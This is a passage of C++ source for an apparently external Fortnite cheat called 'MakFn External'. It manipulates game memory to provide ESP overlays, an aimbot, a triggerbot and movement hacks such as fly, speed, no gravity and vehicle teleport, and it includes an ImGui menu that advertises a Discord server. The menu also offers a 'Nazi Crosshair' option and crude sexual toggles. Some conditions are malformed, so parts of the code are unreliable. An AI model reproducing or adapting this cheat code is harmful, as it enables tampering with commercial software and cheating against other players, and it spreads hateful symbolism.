				if (Esp_fbox) { DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(144, 0, 255, 255)); }

				if (Esp_snapline)
				{
					Vector3 vHeadBone = GetBoneWithRotation(mesh, hitbox);
					DrawLine(Width / 2 - 2, Height, vHeadBone.x, vHeadBone.y, &Col.purple, 0.5f);
				}

				if (Esp_Skeleton)
				{
					Vector3 vHeadBone = GetBoneWithRotation(mesh, 68);
					Vector3 vHip = GetBoneWithRotation(mesh, 2);
					Vector3 vNeck = GetBoneWithRotation(mesh, 67);
					Vector3 vUpperArmLeft = GetBoneWithRotation(mesh, 9);
					Vector3 vUpperArmRight = GetBoneWithRotation(mesh, 38);
					Vector3 vLeftHand = GetBoneWithRotation(mesh, 10);
					Vector3 vRightHand = GetBoneWithRotation(mesh, 39);
					Vector3 vLeftHand1 = GetBoneWithRotation(mesh, 30);
					Vector3 vRightHand1 = GetBoneWithRotation(mesh, 59);
					Vector3 vRightThigh = GetBoneWithRotation(mesh, 78);
					Vector3 vLeftThigh = GetBoneWithRotation(mesh, 71);
					Vector3 vRightCalf = GetBoneWithRotation(mesh, 79);
					Vector3 vLeftCalf = GetBoneWithRotation(mesh, 72);
					Vector3 vLeftFoot = GetBoneWithRotation(mesh, 73);
					Vector3 vRightFoot = GetBoneWithRotation(mesh, 80);
					Vector3 vPelvisOut = GetBoneWithRotation(mesh, 8);
					Vector3 vHeadBoneOut = W2S(vHeadBone);
					Vector3 vPelvis = W2S(vPelvisOut);
					Vector3 vHipOut = W2S(vHip);
					Vector3 vNeckOut = W2S(vNeck);
					Vector3 vUpperArmLeftOut = W2S(vUpperArmLeft);
					Vector3 vUpperArmRightOut = W2S(vUpperArmRight);
					Vector3 vLeftHandOut = W2S(vLeftHand);
					Vector3 vRightHandOut = W2S(vRightHand);
					Vector3 vLeftHandOut1 = W2S(vLeftHand1);
					Vector3 vRightHandOut1 = W2S(vRightHand1);
					Vector3 vRightThighOut = W2S(vRightThigh);
					Vector3 vLeftThighOut = W2S(vLeftThigh);
					Vector3 vRightCalfOut = W2S(vRightCalf);
					Vector3 vLeftCalfOut = W2S(vLeftCalf);
					Vector3 vLeftFootOut = W2S(vLeftFoot);
					Vector3 vRightFootOut = W2S(vRightFoot);

					DrawLine(vHeadBoneOut.x, vHeadBoneOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vHipOut.x, vHipOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vUpperArmLeftOut.x, vUpperArmLeftOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vUpperArmRightOut.x, vUpperArmRightOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vLeftHandOut.x, vLeftHandOut.y, vUpperArmLeftOut.x, vUpperArmLeftOut.y, &Col.white, 0.6f);
					DrawLine(vRightHandOut.x, vRightHandOut.y, vUpperArmRightOut.x, vUpperArmRightOut.y, &Col.white, 0.6f);
					DrawLine(vLeftHandOut.x, vLeftHandOut.y, vLeftHandOut1.x, vLeftHandOut1.y, &Col.white, 0.6f);
					DrawLine(vRightHandOut.x, vRightHandOut.y, vRightHandOut1.x, vRightHandOut1.y, &Col.white, 0.6f);
					DrawLine(vLeftThighOut.x, vLeftThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
					DrawLine(vRightThighOut.x, vRightThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
					DrawLine(vLeftCalfOut.x, vLeftCalfOut.y, vLeftThighOut.x, vLeftThighOut.y, &Col.white, 0.6f);
					DrawLine(vRightCalfOut.x, vRightCalfOut.y, vRightThighOut.x, vRightThighOut.y, &Col.white, 0.6f);
					DrawLine(vLeftFootOut.x, vLeftFootOut.y, vLeftCalfOut.x, vLeftCalfOut.y, &Col.white, 0.6f);
					DrawLine(vRightFootOut.x, vRightFootOut.y, vRightCalfOut.x, vRightCalfOut.y, &Col.white, 0.6f);

					if (espextentions::penis)
					{
						auto penis = W2S({ vPelvis.x, vPelvis.y, vPelvis.z + 3 });
						DrawLine(vPelvis.x, vPelvis.y, penis.x, penis.y, &Col.white, 1.f);
					}

					if (espextentions::unicorn)
					{
						auto head = W2S({ vHeadBone.x, vHeadBone.y, vHeadBone.z + 3 });
						DrawLine(vHeadBone.x, vHeadBone.y, head.x, head.y, &Col.Magenta, 1.f);
					}
				}
			}
		}

		if (exploits || distance <= VisDist)
		{
			bool nobloom;
			uintptr_t CurrentVehicle = read<uintptr_t>(actors::LocalPawn + 0x2310);
			uintptr_t Offset = read<uint64_t>(baseaddy + 0x5107420);
			uintptr_t Buff1 = read<uint64_t>(Offset + 0x105);
			uintptr_t Buff2 = read<uint64_t>(Buff1 + 0xA6);
			uintptr_t Buff3 = read<uint64_t>(Buff2 + 0x30);
			uintptr_t Buff4 = read<uint64_t>(Buff3 + 0x17D0);
			uintptr_t Buff5 = read<uint64_t>(Buff4 + 0x218);
			uintptr_t Buff6 = read<uint64_t>(Buff5 + 0x100);
			INPUT space = { 0 };
			space.type = INPUT_KEYBOARD;
			space.ki.wVk = 0x45;

			if (playerfly) {
				uintptr_t Fly = read<uintptr_t>(baseaddy + 0x86C9AAA);
				uintptr_t FlyBuff1 = read<uintptr_t>(Fly + 0x9F);
				uintptr_t FlyBuff2 = read<uintptr_t>(FlyBuff1 + 0x5E);
				uintptr_t FlyBuff3 = read<uintptr_t>(FlyBuff2 + 0xFF);
				uintptr_t FlyBuff4 = read<uintptr_t>(FlyBuff3 + 0x440);

				write<double>(FlyBuff4 + 0x9BE, 0.0001);
				write<double>(FlyBuff4 + 0x99B, 0.0001);
				write<double>(FlyBuff4 + 0x93D, 0.0001);
			}
			else if (god2dmr) {
				uintptr_t DMR = read<uintptr_t>(baseaddy + 0x2883A10);
				uintptr_t DMRBuff1 = read<uintptr_t>(DMR + 0xDA);
				uintptr_t DMRBuff2 = read<uintptr_t>(DMRBuff1 + 0x3A);
				uintptr_t DMRBuff3 = read<uintptr_t>(DMRBuff2 + 0x67);
				uintptr_t DMRBuff4 = read<uintptr_t>(DMRBuff3 + 0x26);
				uintptr_t DMRBuff5 = read<uintptr_t>(DMRBuff4 + 0x7EA);

				write<double>(DMRBuff5 + 0x26, 0.9999);//troppo veloce
			}
			else if (Collision) {
				double CollisonValue = 99;

				uintptr_t Collision = read<uintptr_t>(baseaddy + 0x8D05519);
				uintptr_t CollisionBuff1 = read<uintptr_t>(Collision + 0x2F4);
				uintptr_t CollisionBuff2 = read<uintptr_t>(CollisionBuff1 + 0xFC);

				write<double>(CollisionBuff2 + 0x4A4, CollisonValue); //può bloccarsi
			}
			else if (nobloom) {
				if (CurrentWeapon && GetAsyncKeyState(VK_LBUTTON)) { write<float>(CurrentWeapon + 0x64, 99); }
			}
			else if (instareload) {
				uintptr_t TwoPoint5Hours1 = read<uintptr_t>(CurrentWeapon + 0xc41);
				uintptr_t TwoPoint5Hours2 = read<uintptr_t>(TwoPoint5Hours1 + 0x1678);
				uintptr_t TwoPoint5Hours3 = read<uintptr_t>(TwoPoint5Hours2 + 0x6233);
				uintptr_t TwoPoint5Hours4 = read<uintptr_t>(TwoPoint5Hours3 + 0xc87);
				uintptr_t TwoPoint5Hours5 = read<uintptr_t>(TwoPoint5Hours4 + 0xb39);
				uintptr_t TwoPoint5Hours6 = read<uintptr_t>(TwoPoint5Hours5 + 0x267);
				uintptr_t TwoPoint5Hours7 = read<uintptr_t>(TwoPoint5Hours6 + 0x5cc);
				uintptr_t TwoPoint5Hours8 = read<uintptr_t>(TwoPoint5Hours7 + 0xc82 + 0x8 + 0x18);

				write<char>(TwoPoint5Hours8 + 0x9c8, 0);
				write<float>(TwoPoint5Hours8 + 0x928, 0.01);

				bool cum = read<bool>(CurrentWeapon + 0x329);

				if (cum) {
					// write<float>(worldsettings + 0x3C0, 70);
				}
				else {
					// write<float>(worldsettings + 0x3C0, 1);
				}
			}
			else if (cartp) {
				if (CurrentVehicle) {
					DWORD_PTR VehicleRootComp = read<DWORD_PTR>(CurrentVehicle + 0x188);
					char cache = read<char>(VehicleRootComp + 0x188);
					write<char>(CurrentVehicle + 0x66b, 1);

					Vector3 Ping = actors::relativelocation;

					if (GetAsyncKeyState(VK_RETURN)) {
						write<char>(VehicleRootComp + 0x188, 0);
						write<Vector3>(VehicleRootComp + 0x128, Vector3{ Ping.x, Ping.y, Ping.z + 100 });
						write<Vector3>(VehicleRootComp + 0x128, Vector3{ Ping.x, Ping.y, Ping.z + 100 });
						write<Vector3>(VehicleRootComp + 0x128, Vector3{ Ping.x, Ping.y, Ping.z + 100 });
						space.ki.dwFlags = NULL;
						SendInput(1, &space, sizeof(INPUT)); // Send KeyDown
					}
					else {
						if (!GetAsyncKeyState(0x45)) {
							space.ki.dwFlags = KEYEVENTF_KEYUP;
							SendInput(1, &space, sizeof(INPUT)); // Send KeyUp
						}
						write<char>(VehicleRootComp + 0x188, cache);
					}
				}
				else {
					if (!GetAsyncKeyState(0x45)) {
						space.ki.dwFlags = KEYEVENTF_KEYUP;
						SendInput(1, &space, sizeof(INPUT)); // Send KeyUp
					}
				}
			}
			else if (midnight) {
				write<float>(Buff6 + 0x20C, 3.402823466e+38F);
				write<float>(Buff6 + 0x218, 3.402823466e+38F);
				write<float>(Buff6 + 0x23B, 3.402823466e+38F);
			}
			else if (speedhax) {
				write<float>(Buff6 + 0x36A, 3.402823466e+38F);
				write<float>(Buff6 + 0x3BF, 3.402823466e+38F);
				write<float>(Buff6 + 0x395, 3.402823466e+38F);
			}
			else if (nogravity) {
				write<float>(Buff6 + 0x310, 3.402823466e+38F);
				write<float>(Buff6 + 0x314, 3.402823466e+38F);
			}
		}

		if (hotkey::hotkeys)
		{
			if (hotkey::Hotkey_Exit)
			{
				if (GetAsyncKeyState(VK_F4)) {
					system("exit");
				}
			}
			else if (hotkey::Hotkey_Esp)
			{
				if (GetAsyncKeyState(VK_F5)) {
					Sleep(200);
					Esp = false;

					Sleep(3000);
					return;
				}
			}
			else if (hotkey::hotkey_Reduce)
			{
				if (GetAsyncKeyState(VK_F6)) {
					Sleep(200);
					ShowWindow(GetConsoleWindow(), SW_HIDE);

					Sleep(3000);
					return;
				}
			}
			else if (hotkey::Hotkey_Findclosestpawn)
			{
				if (GetAsyncKeyState(VK_F1) && closestPawn)
				{
					if (closestPawn != 0) {
						char name[64];
						sprintf_s(name, "[%.fm]\n", distance);
						DrawString(16, Headbox.x, Headbox.y - 35, &Col.white, true, true, name);
					}

					Sleep(3000);
					return;
				}
			}
			else if (hotkey::hotkey_aimat)
			{
				uint64_t currentactormesh = read<uint64_t>(closestPawn + 0x310);
				uint64_t currentaimbotmesh = read<uint64_t>(currentactormesh + hitbox);
				auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
				Vector3 rootHeadOut = W2S(rootHead);
				auto isDBNO = (read<char>(static_cast<uintptr_t>(entity.ID) + 0x7C2) >> 4) & 1;

				if (GetAsyncKeyState(VK_F3), isVisible(currentaimbotmesh) && !isDBNO, Width / 2, Height / 2)
				{
					aimbot(rootHeadOut.x, rootHeadOut.x);

					Sleep(3000);
					return;
				}
			}
		}

		if (AimCheck)
		{
			uint64_t currentactormesh = read<uint64_t>(closestPawn + 0x130);
			uint64_t CurrentHitboneMesh = read<uint64_t>(currentactormesh + hitbox);
			auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
			Vector3 hitbone = W2S(rootHead);
			auto isDBNO = (read<char>(static_cast<uintptr_t>(entity.ID) + 0x7C2) >> 4) & 1;

			if (closestPawn || !isDBNO) {
				if (hitbone.x != 0 && hitbone.y != 0 && hitbone.z != 0)
				{
					std::string hitbone;
					if (hitboxpos == 0) { hitbone = "HEAD"; }
					else if (hitboxpos == 1) { hitbone = "NECK"; }
					else if (hitboxpos == 2) { hitbone = "CHEST"; }
					else if (hitboxpos == 3) { hitbone = "PELVIS"; }
					else if (hitboxpos == 4) { hitbone = "FEET"; }

					ImGui::GetOverlayDrawList()->AddText(ImVec2(940, 90), ImColor(255, 255, 255), _("Aiming at\n", hitbone));
				}
			}
		}

		if (triggerbot)
		{
			uint64_t currentactormesh = read<uint64_t>(closestPawn + 0x130);
			auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
			Vector3 hitbone = W2S(rootHead);
			uint64_t currentaimbotmesh = read<uint64_t>(currentactormesh + hitbox);
			auto isDBNO = (read<char>(static_cast<uintptr_t>(entity.ID) + 0x7C2) >> 4) & 1;

			if (distance < AimFOV && GetAsyncKeyState(VK_RBUTTON))
			{
				if (closestPawn != 0)
				{
					if (hitbone.x != 0 || hitbone.y != 0 || hitbone.z != 0)
					{
						if (!isDBNO) {
							keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
						}
						keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_KEYUP, 0);
					}
					keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_KEYUP, 0);
				}
				keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_KEYUP, 0);
			}
		}

		if (AimbotInput or AimbotRageing) {
			auto dx = w2sheade.x - (Width / 2);
			auto dy = w2sheade.y - (Height / 2);
			auto dist = sqrtf(dx * dx + dy * dy);
			auto bIsDBNO = (read<uintptr_t>(mesh + 0x7C0));
			auto bIsdying = (read<uintptr_t>(mesh + 0x6f8));

			if (dist < AimFOV && dist < closestDistance) {
				if (isVisible(mesh)) {
					if (!bIsDBNO || !bIsdying) {
						closestDistance = dist;
						closestPawn = entity.Actor;
					}
				}
			}
		}
	}

	if (AimbotInput) {
		uint64_t currentactormesh = read<uint64_t>(closestPawn + 0x310);
		auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
		Vector3 hitbone = W2S(rootHead);
		Vector3 Headpos = GetBoneWithRotation(currentactormesh, 68);
		Vector3 HeadBoneOut = W2S(Vector3(hitbone.x, hitbone.y, hitbone.z));
		uintptr_t AimbotMesh = (closestPawn, 0x310);

		if (closestPawn && GetAsyncKeyState(VK_RBUTTON) < 0) {
			if (closestPawn != 0)
			{
				if (hitbone.x != 10 || hitbone.y != 10 || hitbone.z != 10)
				{
					if ((GetDistance(hitbone.x, hitbone.y, hitbone.z, Width / 2, Height / 2) <= AimFOV))
					{
						if (isVisible(AimbotMesh)) {
							aimbot(hitbone.x, hitbone.y);
						}
					}
				}
			}
			else
			{
				closestDistance = FLT_MAX;
				closestPawn = NULL;
			}
		}
	}

	if (AimbotRageing) {
		uint64_t currentactormesh = read<uint64_t>(closestPawn + 0x310);
		auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
		Vector3 hitbone = W2S(rootHead);
		Vector3 Headpos = GetBoneWithRotation(currentactormesh, 68);
		Vector3 HeadBoneOut = W2S(Vector3(hitbone.x, hitbone.y, hitbone.z));
		Vector3 HeadBoneOut1 = W2S(Vector3(hitbone));
		uintptr_t AimbotMesh = (closestPawn, 0x310);
		auto rootofpawn = GetBoneWithRotation(currentactormesh, 0);
		Vector3 root = W2S(rootofpawn);
		float Hitbone_Area = root.Distance(HeadBoneOut1) / 5.f;

		if (closestPawn != 0 && GetAsyncKeyState(VK_RBUTTON) < 0) {
			if (isVisible(AimbotMesh)) {
				if ((GetDistance(AimbotMesh, HeadBoneOut1.x, HeadBoneOut1.y, Width / 2, Height / 2) <= AimFOV))
				{
					aimbot(hitbone.x, hitbone.y);
				}
			}
		}

		// fire recoil check
		if (GetAsyncKeyState(VK_LBUTTON)) {
			if (isVisible(AimbotMesh)) {
				if (HeadBoneOut.x, HeadBoneOut.y, HeadBoneOut.z) {
					smooth = 2.0;
				}
			}
		}

		// aim checking
		if (GetAsyncKeyState(VK_RBUTTON)) {
			if (isVisible(AimbotMesh)) {
				if (HeadBoneOut.x, HeadBoneOut.y, HeadBoneOut.z) {
					smooth = 3.5;
				}
			}
		}
		else if (GetAsyncKeyState(VK_RBUTTON) == NULL) {
			if (!isVisible(AimbotMesh)) {
				if (!HeadBoneOut.x, !HeadBoneOut.y, !HeadBoneOut.z) {
					smooth = 1.5;
				}
			}
		}
	}
}

ImDrawList* draw;
ImGuiIO& io = ImGui::GetIO();
void render()
{
	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();

	if (DeveloperAdjust == true) { if (GetAsyncKeyState(VK_DOWN) & 1) { DeveloperAdjust = false; } }
	if (DeveloperAdjust == true)
	{
		ImGui::StyleColorsClassic();
		ImGuiStyle& style = ImGui::GetStyle();
		style.Colors[ImGuiCol_Text] = ImVec4(0.972f, 0.967f, 0.967f, 1.000f);
		style.Colors[ImGuiCol_TextDisabled] = ImVec4(0.989f, 0.989f, 0.989f, 1.000f);
		style.Colors[ImGuiCol_BorderShadow] = ImVec4(0.983f, 0.041f, 0.041f, 0.000f);
		style.Colors[ImGuiCol_FrameBg] = ImVec4(0.485f, 0.148f, 0.148f, 0.540f);
		style.Colors[ImGuiCol_FrameBgHovered] = ImVec4(0.457f, 0.116f, 0.116f, 0.400f);
		style.Colors[ImGuiCol_FrameBgActive] = ImVec4(0.423f, 0.060f, 0.060f, 0.670f);
		style.Colors[ImGuiCol_TitleBg] = ImVec4(0.978f, 0.019f, 0.019f, 1.000f);
		style.Colors[ImGuiCol_TitleBgActive] = ImVec4(0.989f, 0.025f, 0.025f, 1.000f);
		style.Colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.473f, 0.044f, 0.044f, 0.510f);
		style.Colors[ImGuiCol_MenuBarBg] = ImVec4(0.574f, 0.037f, 0.037f, 1.000f);
		style.Colors[ImGuiCol_ScrollbarBg] = ImVec4(0.008f, 0.008f, 0.008f, 0.530f);
		style.Colors[ImGuiCol_CheckMark] = ImVec4(0.720f, 0.127f, 0.127f, 1.000f);
		style.Colors[ImGuiCol_SliderGrab] = ImVec4(0.720f, 0.111f, 0.111f, 1.000f);
		style.Colors[ImGuiCol_SliderGrabActive] = ImVec4(0.944f, 0.119f, 0.119f, 1.000f);
		style.Colors[ImGuiCol_Button] = ImVec4(0.787f, 0.130f, 0.130f, 0.400f);
		style.Colors[ImGuiCol_ButtonHovered] = ImVec4(0.989f, 0.019f, 0.019f, 1.000f);
		style.Colors[ImGuiCol_ButtonActive] = ImVec4(0.787f, 0.130f, 0.130f, 0.400f);
		style.WindowPadding = ImVec2(9.000f, 8.000f);
		style.WindowRounding = 11.000f;
		static int tabb = 0;

		ImGui::SetNextWindowSize(ImVec2(490.000f, 360.000f), ImGuiCond_Once);
		if (!ImGui::Begin("Cheat Menu Stats", NULL, 59))
		{
			ImGui::End();
			return;
		}
		if (ImGui::Button("Hotkeys", ImVec2(130.000f, 28.000f))) { tabb = 3; }
		ImGui::SameLine();
		if (ImGui::Button("World Esp", ImVec2(130.000f, 28.000f))) { tabb = 4; }
		ImGui::Spacing();
		static ImVec4 inactive = ImColor(0, 136, 255, 255);
		static ImVec4 active = ImColor(255, 255, 255, 255);

		switch (tabb) {
		case 0:
			ImGui::Text("                    Hotkey Down To Close");
			break;
		case 1:
			break;
		case 2:
			ImGui::Text("Esp Extentions");
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		case 3:
			if (hotkey::hotkeys == false) {
				ImGui::Checkbox("Hotkey Selection", &hotkey::hotkeys);
				ImGui::Text("Hotkeys for External");
			}
			else if (hotkey::hotkeys == true)
			{
				ImGui::Text("Hotkey Selection For External");
				ImGui::Spacing();
				ImGui::Checkbox("Hotkey End", &hotkey::Hotkey_Exit);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0, 255), ("F4"));
				ImGui::Checkbox("Hotkey Stop Cheat", &hotkey::Hotkey_Esp);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0, 255), ("F5"));
				ImGui::Checkbox("Hotkey Reduce Lag", &hotkey::hotkey_Reduce);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0, 255), ("F6"));
				ImGui::Checkbox("Hotkey Find CLosest Pawn", &hotkey::Hotkey_Findclosestpawn);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0, 255), ("F1"));
				ImGui::Spacing();
				ImGui::Text("Aimbot Hotkeys");
				ImGui::Checkbox("Aim at closestpawn", &hotkey::hotkey_aimat);
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 0, 0, 255), ("F3"));
				ImGui::Spacing();
				ImGui::Checkbox("Hotkey Selection", &hotkey::hotkeys);
			}
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		case 4:
			ImGui::Text("World Esp For External");
			ImGui::Spacing();
			ImGui::Checkbox("Loot Ammo Esp", &worldesp::world_ammo);
			ImGui::Checkbox("Loot Chests Esp", &worldesp::world_chests);
			ImGui::Checkbox("Loot Lama Esp", &worldesp::world_lama);
			ImGui::Checkbox("Loot Supplydrops Esp", &worldesp::world_supplydrop);
			ImGui::Checkbox("Loot Weapons Esp", &worldesp::world_weapon);
			ImGui::Checkbox("World Cars Esp", &worldesp::world_car);
			ImGui::Checkbox("World Boats Esp", &worldesp::world_boat);
			ImGui::Checkbox("World Animals Esp", &worldesp::world_animal);
			ImGui::Spacing();
			ImGui::SliderInt("World Esp Rendering", &worldesp::WorldEspDistance, 1.f, 1000.f);
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		}
		ImGui::End();
	}

	if (GetAsyncKeyState(VK_INSERT)) { ShowMenu = !ShowMenu; }
	static int maintabs;
	if (ShowMenu == true) {
		ImVec4* colors = ImGui::GetStyle().Colors;
		colors[ImGuiCol_Text] = ImVec4(0.80f, 0.80f, 0.83f, 1.00f);
		colors[ImGuiCol_TextDisabled] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_ChildWindowBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
		colors[ImGuiCol_PopupBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
		colors[ImGuiCol_Border] = ImVec4(0.80f, 0.80f, 0.83f, 0.88f);
		colors[ImGuiCol_BorderShadow] = ImVec4(0.92f, 0.91f, 0.88f, 0.00f);
		colors[ImGuiCol_FrameBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_FrameBgHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_FrameBgActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_MenuBarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_ScrollbarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
		colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_SliderGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
		colors[ImGuiCol_SliderGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_Button] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_ButtonHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_ButtonActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_Header] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_HeaderHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_HeaderActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_Column] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ColumnHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_ColumnActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ResizeGrip] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ResizeGripActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_CheckMark] = ImVec4(0.150f, 0.361f, 0.696f, 1.000f);
		colors[ImGuiCol_PlotLines] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
		colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
		colors[ImGuiCol_PlotHistogram] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
		colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
		colors[ImGuiCol_TextSelectedBg] = ImVec4(0.25f, 1.00f, 0.00f, 0.43f);
		colors[ImGuiCol_ModalWindowDarkening] = ImVec4(1.00f, 0.98f, 0.95f, 0.73f);

		ImGui::GetStyle().WindowPadding = ImVec2(15, 15);
		ImGui::GetStyle().WindowRounding = 5.0f;
		ImGui::GetStyle().FramePadding = ImVec2(5, 5);
		ImGui::GetStyle().FrameRounding = 4.0f;
		ImGui::GetStyle().ItemSpacing = ImVec2(12, 8);
		ImGui::GetStyle().ItemInnerSpacing = ImVec2(8, 6);
		ImGui::GetStyle().IndentSpacing = 25.0f;
		ImGui::GetStyle().ScrollbarSize = 15.0f;
		ImGui::GetStyle().ScrollbarRounding = 9.0f;
		ImGui::GetStyle().GrabMinSize = 5.0f;
		ImGui::GetStyle().GrabRounding = 3.0f;

		ImGui::SetNextWindowSize({ 450, 470 });
		ImGui::Begin("Makfn", NULL, ImGuiWindowFlags_::ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_::ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_::ImGuiWindowFlags_NoResize | ImGuiWindowFlags_::ImGuiWindowFlags_NoCollapse);
		ImVec2 p = ImGui::GetWindowPos();
		static ImVec4 inactive = ImColor(0, 136, 255, 255);
		static ImVec4 active = ImColor(255, 255, 255, 255);
		static int tab = 0;

		ImGui::SetCursorPos(ImVec2(15.000f, 10.000f));
		if (ImGui::Button("Aim", ImVec2(130.000f, 28.000f))) { tab = 1; }
		ImGui::SameLine();
		if (ImGui::Button("Visuals", ImVec2(130.000f, 28.000f))) { tab = 2; }
		ImGui::SameLine();
		if (ImGui::Button("Misc", ImVec2(130.000f, 28.000f))) { tab = 3; }

		ImGui::Spacing();
		switch (tab) {
		case 0:
			ImGui::Text(" [+] MakFn 1.2");
			ImGui::Text(" [+] MakFn Menu Recreation");
			ImGui::Text(" [+] Discord.gg/makfn");
			ImGui::Text(" [+] Fortnite External");
			break;
		case 1:
			ImGui::Checkbox("Aimbot", &AimbotInput);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(0, 136, 255, 255), ("[?]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("Soft MouseMovent Modified For Players: (Example: Legit Aimbot and Softaim Combined"));
				ImGui::EndTooltip();
			}
			ImGui::Checkbox("Memory Aimbot", &memoryaim);
			ImGui::Combo("Aimbone", &hitboxpos, hitboxes, sizeof(hitboxes) / sizeof(*hitboxes));
			ImGui::Spacing();
			ImGui::SliderFloat("Aimbot Distance", &AimFOV, 1.5f, 500.f);
			ImGui::SliderFloat("Aimbot Smoothness", &smooth, 0.5f, 10.f);
			ImGui::Spacing();
			ImGui::Checkbox("FovCircle", &DynamicFov);
			if (DynamicFov == true)
			{
				ImGui::SameLine();
				ImGui::Checkbox("FovCircle Filled", &Filledfov);
			}
			ImGui::Checkbox("FovSquare", &square);
			ImGui::Checkbox("Fov Crosshair", &crosshair);
			ImGui::Checkbox("Nazi Crosshair", &heilhitler);
			ImGui::Spacing();
			ImGui::SliderInt("Fov Size", &FovSize, 25.f, 600.f);
			ImGui::Spacing();
			ImGui::Checkbox("Aimbot AimCircle", &DrawEnemyFov);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(0, 136, 255, 255), ("[?]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("Draws a Aimbot Fov on a Enemys Players head"));
				ImGui::EndTooltip();
			}
			ImGui::Checkbox("AimCheck", &AimCheck);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(0, 136, 255, 255), ("[?]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("When aiming at a enemy player it will say the distance and the body part."));
				ImGui::EndTooltip();
			}
			ImGui::Spacing();
			ImGui::Checkbox("TriggerBot", &triggerbot);
			ImGui::Spacing();
